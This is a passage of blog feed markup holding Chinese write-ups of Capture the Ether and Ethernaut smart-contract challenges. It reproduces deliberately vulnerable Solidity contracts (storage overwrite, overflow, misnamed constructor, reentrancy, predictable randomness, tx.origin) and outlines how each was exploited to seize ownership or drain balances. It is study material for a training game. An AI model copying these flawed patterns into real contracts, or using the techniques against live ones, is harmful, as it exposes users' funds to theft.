 function withdraw() public &#123;<br>        require(msg.sender == owner);<br>        <br>        msg.sender.transfer(address(this).balance);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析：只有成为owner才能进行withdraw，将钱取出来。（合约中没有任何直接修改owner的方法）<br>在donate函数中直接对结构体Donation进行了初始化，并没有使用memory关键字，于是此处的Donation存储在storage中，由合约对属性的定义顺序，owner的key值为1，恰好donation.etherAmount会将其覆盖，也就是说：我们只需要将我们的地址作为参数执行donate方法便可以更改owner。<br>因为<code>require(msg.value == etherAmount / scale)</code>这一条件。我们将自己的地址进行计算一下，来得知我们需要向合约发送多少value。</p><p>实现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function getValut(uint256 amount) public pure returns (uint2565) &#123;<br>    return amount / 10**36;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/04/01/Capture-the-Ether/storage_structure_14.png"><br>通过计算得出msg.value的值为979192615699<br><img src="/2023/04/01/Capture-the-Ether/storage_structure_15.png"><br>在执行donate方法成功后我们再次调用owner可以看到owner已经是我们自己的地址了，接着进行withdraw就可以通关了。</p><h2 id="Fifty-years"><a href="#Fifty-years" class="headerlink" title="Fifty years"></a>Fifty years</h2><p>要求：<del>等到50年后</del>取走合约中的money<br>源代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract FiftyYearsChallenge &#123;<br>    struct Contribution &#123;<br>        uint256 amount;<br>        uint256 unlockTimestamp;<br>    &#125;<br>    Contribution[] queue;<br>    uint256 head;<br><br>    address owner;<br>    function FiftyYearsChallenge(address player) public payable &#123;<br>        require(msg.value == 1 ether);<br><br>        owner = player;<br>        queue.push(Contribution(msg.value, now + 50 years));<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function upsert(uint256 index, uint256 timestamp) public payable &#123;<br>        require(msg.sender == owner);<br><br>        if (index &gt;= head &amp;&amp; index &lt; queue.length) &#123;<br>            // Update existing contribution amount without updating timestamp.<br>            Contribution storage contribution = queue[index];<br>            contribution.amount += msg.value;<br>        &#125; else &#123;<br>            // Append a new contribution. Require that each contribution unlock<br>            // at least 1 day after the previous one.<br>            require(timestamp &gt;= queue[queue.length - 1].unlockTimestamp + 1 days);<br><br>            contribution.amount = msg.value;<br>            contribution.unlockTimestamp = timestamp;<br>            queue.push(contribution);<br>        &#125;<br>    &#125;<br><br>    function withdraw(uint256 index) public &#123;<br>        require(msg.sender == owner);<br>        require(now &gt;= queue[index].unlockTimestamp);<br><br>        // Withdraw this and any earlier contributions.<br>        uint256 total = 0;<br>        for (uint256 i = head; i &lt;= index; i++) &#123;<br>            total += queue[i].amount;<br><br>            // Reclaim storage.<br>            delete queue[i];<br>        &#125;<br><br>        // Move the head of the queue forward so we don&#x27;t have to loop over<br>        // already-withdrawn contributions.<br>        head = index + 1;<br><br>        msg.sender.transfer(total);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析：<br>第一点：如何解决50年的时间问题：这里的<code>unlockTimestamp</code>可以发生上溢从而归零。所以在upsert函数中通过设置<code>timestamp=0</code>可以将时间限制解除。于是需要对upsert进行两次调用，第一次将<code>unlockTimeStamp</code>设置为<code>+1days</code>就能发生溢出的极限值，第二次调用就可以绕过检查设置为0。<br>根据前面几题的经验可以看到在upsert函数中<code>contribution.amount</code>和<code>contribution.unlockTimestamp</code>都造成了变量覆盖：分别将<code>queue</code>的长度和<code>head</code>的值进行了覆盖。<br>实现：</p><ol><li>部署合约</li><li>进行第一次upsert调用，设置为时间溢出的极限值<br><img src="/2023/04/01/Capture-the-Ether/Fift_1.png"><del>这里应该设1wei，否则queue的length不够</del></li><li>进行第二次upsert调用，设置为0</li></ol><p><img src="/2023/04/01/Capture-the-Ether/Fift_2.png"><br>第一次调用中同时改变了head的值，index大于2不是硬性要求<br>4. 第三次进行withdraw调用<br><img src="/2023/04/01/Capture-the-Ether/Fift_3.png"></p><h1 id="Accounts"><a href="#Accounts" class="headerlink" title="Accounts"></a>Accounts</h1><p>这一部分有一些关于以太坊的密码学原理包括椭圆曲线加密，ECDSA签名算法等，他们与合约漏洞并无关系</p><h2 id="Fuzzy-identity"><a href="#Fuzzy-identity" class="headerlink" title="Fuzzy identity"></a>Fuzzy identity</h2><p>要求：获取私钥<br>源代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>interface IName &#123;<br>    function name() external view returns (bytes32);<br>&#125;<br><br>contract FuzzyIdentityChallenge &#123;<br>    bool public isComplete;<br><br>    function authenticate() public &#123;<br>        require(isSmarx(msg.sender));<br>        require(isBadCode(msg.sender));<br><br>        isComplete = true;<br>    &#125;<br><br>    function isSmarx(address addr) internal view returns (bool) &#123;<br>        return IName(addr).name() == bytes32(&quot;smarx&quot;);<br>    &#125;<br><br>    function isBadCode(address _addr) internal pure returns (bool) &#123;<br>        bytes20 addr = bytes20(_addr);<br>        bytes20 id = hex&quot;000000000000000000000000000000000badc0de&quot;;<br>        bytes20 mask = hex&quot;000000000000000000000000000000000fffffff&quot;;<br><br>        for (uint256 i = 0; i &lt; 34; i++) &#123;<br>            if (addr &amp; mask == id) &#123;<br>                return true;<br>            &#125;<br>            mask &lt;&lt;= 4;<br>            id &lt;&lt;= 4;<br>        &#125;<br><br>        return false;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析：要通过验证需要通过<code>isSmarx()</code>和<code>isBadCode()</code>的验证，因此需要一个能返回一个特殊名字<code>smarx</code>的合约以及合约地址包含十六进制字符串<code>badc0de</code>。<br>因此，这个挑战就是要暴力破解大量合约，直到你最终获得一个包含目标字符串的合约地址</p><blockquote><p>tips：<br>十六进制字面常数<br>十六进制字面常数以关键字 hex 打头，后面紧跟着用单引号或双引号引起来的字符串（例如，hex”001122FF”）。 字符串的内容必须是一个十六进制的字符串，它们的值将使用二进制表示。它们可以隐式地转换成 bytes1，……，bytes32，如果合适的话，还可以转换成 bytes 以及 string。</p></blockquote><h2 id="Public-Key"><a href="#Public-Key" class="headerlink" title="Public Key"></a>Public Key</h2><p>要求：账户的公钥<br>源代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract PublicKeyChallenge &#123;<br>    address owner = 0x92b28647ae1f3264661f72fb2eb9625a89d88a31;<br>    bool public isComplete;<br><br>    function authenticate(bytes publicKey) public &#123;<br>        require(address(keccak256(publicKey)) == owner);<br><br>        isComplete = true;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们都知道以太坊的地址与比特币的一样由公钥计算而来。<br>在用户进行交易时往往需要进行签名，而这个签名中就含有公钥（供其他人验证交易来自于该账户），</p><h2 id="Account-Takeover"><a href="#Account-Takeover" class="headerlink" title="Account Takeover"></a>Account Takeover</h2><p>要求：成为owner<br>源代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract AccountTakeoverChallenge &#123;<br>    address owner = 0x6B477781b0e68031109f21887e6B5afEAaEB002b;<br>    bool public isComplete;<br><br>    function authenticate() public &#123;<br>        require(msg.sender == owner);<br><br>        isComplete = true;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="Miscellaneous"><a href="#Miscellaneous" class="headerlink" title="Miscellaneous"></a>Miscellaneous</h1><h2 id="Assume-ownership"><a href="#Assume-ownership" class="headerlink" title="Assume ownership"></a>Assume ownership</h2><p>要求：成为owner<br>源代码：  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract AssumeOwnershipChallenge &#123;<br>    address owner;<br>    bool public isComplete;<br><br>    function AssumeOwmershipChallenge() public &#123;<br>        owner = msg.sender;<br>    &#125;<br><br>    function authenticate() public &#123;<br>        require(msg.sender == owner);<br><br>        isComplete = true;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析：构造函数的错误使其变成了一个公共的方法，使得任何人都可以直接使用来声明所有权。</p><h2 id="Token-bank"><a href="#Token-bank" class="headerlink" title="Token bank"></a>Token bank</h2><p>要求：获取Token合约中的余额<br>源代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>interface ITokenReceiver &#123;<br>    function tokenFallback(address from, uint256 value, bytes data) external;<br>&#125;<br><br>contract SimpleERC223Token &#123;<br>    // Track how many tokens are owned by each address.<br>    mapping (address =&gt; uint256) public balanceOf;<br><br>    string public name = &quot;Simple ERC223 Token&quot;;<br>    string public symbol = &quot;SET&quot;;<br>    uint8 public decimals = 18;<br><br>    uint256 public totalSupply = 1000000 * (uint256(10) ** decimals);<br><br>    event Transfer(address indexed from, address indexed to, uint256 value);<br><br>    function SimpleERC223Token() public &#123;<br>        balanceOf[msg.sender] = totalSupply;<br>        emit Transfer(address(0), msg.sender, totalSupply);<br>    &#125;<br><br>    function isContract(address _addr) private view returns (bool is_contract) &#123;<br>        uint length;<br>        assembly &#123;<br>            //retrieve the size of the code on target address, this needs assembly<br>            length := extcodesize(_addr)<br>        &#125;<br>        return length &gt; 0;<br>    &#125;<br><br>    function transfer(address to, uint256 value) public returns (bool success) &#123;<br>        bytes memory empty;<br>        return transfer(to, value, empty);<br>    &#125;<br><br>    function transfer(address to, uint256 value, bytes data) public returns (bool) &#123;<br>        require(balanceOf[msg.sender] &gt;= value);<br><br>        balanceOf[msg.sender] -= value;<br>        balanceOf[to] += value;<br>        emit Transfer(msg.sender, to, value);<br><br>        if (isContract(to)) &#123;<br>            ITokenReceiver(to).tokenFallback(msg.sender, value, data);<br>        &#125;<br>        return true;<br>    &#125;<br><br>    event Approval(address indexed owner, address indexed spender, uint256 value);<br><br>    mapping(address =&gt; mapping(address =&gt; uint256)) public allowance;<br><br>    function approve(address spender, uint256 value)<br>        public<br>        returns (bool success)<br>    &#123;<br>        allowance[msg.sender][spender] = value;<br>        emit Approval(msg.sender, spender, value);<br>        return true;<br>    &#125;<br><br>    function transferFrom(address from, address to, uint256 value)<br>        public<br>        returns (bool success)<br>    &#123;<br>        require(value &lt;= balanceOf[from]);<br>        require(value &lt;= allowance[from][msg.sender]);<br><br>        balanceOf[from] -= value;<br>        balanceOf[to] += value;<br>        allowance[from][msg.sender] -= value;<br>        emit Transfer(from, to, value);<br>        return true;<br>    &#125;<br>&#125;<br><br>contract TokenBankChallenge &#123;<br>    SimpleERC223Token public token;<br>    mapping(address =&gt; uint256) public balanceOf;<br><br>    function TokenBankChallenge(address player) public &#123;<br>        token = new SimpleERC223Token();<br><br>        // Divide up the 1,000,000 tokens, which are all initially assigned to<br>        // the token contract&#x27;s creator (this contract).<br>        balanceOf[msg.sender] = 500000 * 10**18;  // half for me<br>        balanceOf[player] = 500000 * 10**18;      // half for you<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return token.balanceOf(this) == 0;<br>    &#125;<br><br>    function tokenFallback(address from, uint256 value, bytes) public &#123;<br>        require(msg.sender == address(token));<br>        require(balanceOf[from] + value &gt;= balanceOf[from]);<br><br>        balanceOf[from] += value;<br>    &#125;<br><br>    function withdraw(uint256 amount) public &#123;<br>        require(balanceOf[msg.sender] &gt;= amount);<br><br>        require(token.transfer(msg.sender, amount));<br>        balanceOf[msg.sender] -= amount;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析：合约自定义了<code>ERC-233</code>标准，（ERC-233与ERC-20的不同之处在于如果接收人的地址是一个合约将会通过<code>tokenFallback</code>方法来通知接收方转移。在Token合约创建的时候，就有一百万的token余额，其中50万给了创建者，50万给了玩家。所以需要获取更多的token来完成挑战。<br>可以看到如果我们通过攻击合约利用Token合约向Bank转账时，会触发<code>isContract</code>执行Bank合约中的<code>tokenFallback</code>从而增加Bank中的余额，之后我们再通过<code>withdraw</code>向Bank取款就行了。  </p><blockquote><p>同时在<code>withdraw</code>函数中合约先向我们转账再减我们的余额，这使得我们可以重复地提取我们的余额，重入的过程将会是：<code>challenge.withdraw() -&gt; token.transfer() -&gt; msg.sender.tokenFallback() -&gt; ... </code>直到余额为0。</p></blockquote><p>实现：先部署攻击合约，再将攻击合约作为player部署Bank<br><img src="/2023/04/01/Capture-the-Ether/TokenBank_1.png"><br>接着直接调用<code>CallWithdraw</code>（执行成功后，可以在交易日志中看到进行了两次transfer调用。进入<code>tokenFallback</code>后又调用了一次）<br><img src="/2023/04/01/Capture-the-Ether/TokenBank.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;由于Ropsten测试网络在2022.10.5日起已被正式弃用；因此该网页上的在线编写功能无法正常运行；所有实现均在remix上复现，收录在本系列之中，希望对各位看官有所帮助&lt;br&gt;&lt;del&gt;(TvT)&lt;/del&gt; &lt;del&gt;(TvT)&lt;/del&gt; &lt;del&gt;(TvT)&lt;/del&gt; &lt;del&gt;(TvT)&lt;/del&gt; &lt;del&gt;(TvT)&lt;/del&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="靶场" scheme="http://lexlady.top/categories/%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="题解" scheme="http://lexlady.top/tags/%E9%A2%98%E8%A7%A3/"/>
    
    <category term="Remix" scheme="http://lexlady.top/tags/Remix/"/>
    
    <category term="CapturetheEther" scheme="http://lexlady.top/tags/CapturetheEther/"/>
    
  </entry>
  
  <entry>
    <title>Ethernaut</title>
    <link href="http://lexlady.top/2023/02/25/Ether/"/>
    <id>http://lexlady.top/2023/02/25/Ether/</id>
    <published>2023-02-25T12:44:02.000Z</published>
    <updated>2023-05-23T06:21:14.261Z</updated>
    
    <content type="html"><![CDATA[<p>此文章会记录在Ethernaut上经历的题。</p><span id="more"></span><h1 id="Hello-Ethernaut"><a href="#Hello-Ethernaut" class="headerlink" title="Hello Ethernaut"></a>Hello Ethernaut</h1><p>在第一题中，我们会跟着引导通过web终端进行操作，基本上没什么难度，一步步地按照提示来做就行。<del>你甚至可以通过直接查看合约ABI来推断出答案，实在是太友好了！！</del><br>收获：  </p><ul><li>关键字的使用</li><li>各种变量的存储位置</li></ul><hr><h1 id="Fallback"><a href="#Fallback" class="headerlink" title="Fallback"></a>Fallback</h1><p>任务要求：获取合约的所有权；将余额减为零<br><strong>源代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Fallback &#123;<br><br>  mapping(address =&gt; uint) public contributions;<br>  address public owner;<br><br>  constructor() &#123;<br>    owner = msg.sender;<br>    contributions[msg.sender] = 1000 * (1 ether);<br>  &#125;<br><br>  modifier onlyOwner &#123;<br>        require(<br>            msg.sender == owner,<br>            &quot;caller is not the owner&quot;<br>        );<br>        _;<br>    &#125;<br><br>  function contribute() public payable &#123;<br>    require(msg.value &lt; 0.001 ether);<br>    contributions[msg.sender] += msg.value;<br>    if(contributions[msg.sender] &gt; contributions[owner]) &#123;<br>      owner = msg.sender;<br>    &#125;<br>  &#125;<br><br>  function getContribution() public view returns (uint) &#123;<br>    return contributions[msg.sender];<br>  &#125;<br><br>  function withdraw() public onlyOwner &#123;<br>    payable(owner).transfer(address(this).balance);<br>  &#125;<br><br>  receive() external payable &#123;<br>    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);<br>    owner = msg.sender;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>解题点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">receive() external payable &#123;<br>  require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);<br>  owner = msg.sender;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>receive方法</p><ul><li>一个合约至多含有一个receive()函数,</li><li>没有function关键字、没有参数，没有返回值</li><li>可见性必须声明为external，必须含有payable关键字</li><li>允许使用modifier修改器</li></ul><p>当本合约收到ether但并未被调用任何函数，未接受任何数据，receive函数被触发，执行ether的传输（类似于基本的send(),transfer()函数）；如果合约中不存在此类方法，但拥有一个可支付的回退函数将触发回退函数执行ether的操作；如果都不存在，那么合约将不能接受ether并抛出异常</p><p>选自<a href="https://docs.soliditylang.org/en/v0.8.13/contracts.html#receive-ether-function">solidity官方文档v0.8.13</a></p></blockquote><p>参考：<br>1）执行实例中的contribute方法，向合约发送最多0.001ether。<br>2）向合约发送以太，触发receive方法。<br>3）执行实例中的withdraw方法</p><hr><h1 id="Fallout"><a href="#Fallout" class="headerlink" title="Fallout"></a>Fallout</h1><p>任务要求：获取合约的所有权<del>卖眼镜的做的题</del><br><strong>源代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>import &#x27;openzeppelin-contracts-06/math/SafeMath.sol&#x27;;<br><br>contract Fallout &#123;<br>  <br>  using SafeMath for uint256;<br>  mapping (address =&gt; uint) allocations;<br>  address payable public owner;<br><br><br>  /* constructor */<br>  function Fal1out() public payable &#123;<br>    owner = msg.sender;<br>    allocations[owner] = msg.value;<br>  &#125;<br><br>  modifier onlyOwner &#123;<br>        require(<br>            msg.sender == owner,<br>            &quot;caller is not the owner&quot;<br>        );<br>        _;<br>    &#125;<br><br>  function allocate() public payable &#123;<br>    allocations[msg.sender] = allocations[msg.sender].add(msg.value);<br>  &#125;<br><br>  function sendAllocation(address payable allocator) public &#123;<br>    require(allocations[allocator] &gt; 0);<br>    allocator.transfer(allocations[allocator]);<br>  &#125;<br><br>  function collectAllocations() public onlyOwner &#123;<br>    msg.sender.transfer(address(this).balance);<br>  &#125;<br><br>  function allocatorBalance(address allocator) public view returns (uint) &#123;<br>    return allocations[allocator];<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>解题点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Fallout is Ownable &#123;...<br><br>function Fal1out() public payable &#123;...<br></code></pre></td></tr></table></figure><p>作为构造函数其名称居然与合约名称不一致，使其成为了任何人都可以执行的公共函数</p><blockquote><p>在solidity 0.4.22版本及其之后中使用function声明构造函数的方法被舍弃，而采用了使用关键字constructor来声明构造函数。</p><blockquote><p>这是在使用编译器0.4.22之前的版本时所需注意的</p></blockquote></blockquote><p>参考：直接调用函数Fal1out</p><hr><h1 id="Coin-Flip"><a href="#Coin-Flip" class="headerlink" title="Coin Flip"></a>Coin Flip</h1><p>任务要求：连续猜对硬币的正反面十次。<del>区区千分之一的运气我也不是没有</del><br><strong>源代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract CoinFlip &#123;<br><br>  uint256 public consecutiveWins;<br>  uint256 lastHash;<br>  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;<br><br>  constructor() &#123;<br>    consecutiveWins = 0;<br>  &#125;<br><br>  function flip(bool _guess) public returns (bool) &#123;<br>    uint256 blockValue = uint256(blockhash(block.number - 1));<br><br>    if (lastHash == blockValue) &#123;<br>      revert();<br>    &#125;<br><br>    lastHash = blockValue;<br>    uint256 coinFlip = blockValue / FACTOR;<br>    bool side = coinFlip == 1 ? true : false;<br><br>    if (side == _guess) &#123;<br>      consecutiveWins++;<br>      return true;<br>    &#125; else &#123;<br>      consecutiveWins = 0;<br>      return false;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>解题点：<br>硬币的正反面取决于上一个块，结果看起来是随机的但却是可预测的，我们也可以通过获取上一个区块的信息来运行一次题目的算法然后选择对应的结果。因为在一个区块中的交易不止一个，所以只要保证在生成下一个区块前将完成操作即可。</p><p>参考：<br>获取实例地址<br>在remix上部署一份攻击合约（只需要在获取结果后调用实例）<br>之后连续使用攻击合约的方法进行攻击10次就行</p><blockquote><p>知识点<br>SafeMath库：防溢出的增强型运算方法<br>block.num：当前区块数（记得添加一个与web3的链接<br>block.blockhash：区块哈希值</p></blockquote><hr><h1 id="Telephone"><a href="#Telephone" class="headerlink" title="Telephone"></a>Telephone</h1><p>任务要求：获取合约的所有权<br><strong>源代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Telephone &#123;<br><br>  address public owner;<br><br>  constructor() &#123;<br>    owner = msg.sender;<br>  &#125;<br><br>  function changeOwner(address _owner) public &#123;<br>    if (tx.origin != msg.sender) &#123;<br>      owner = _owner;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>解题点：</p><figure class="highlight 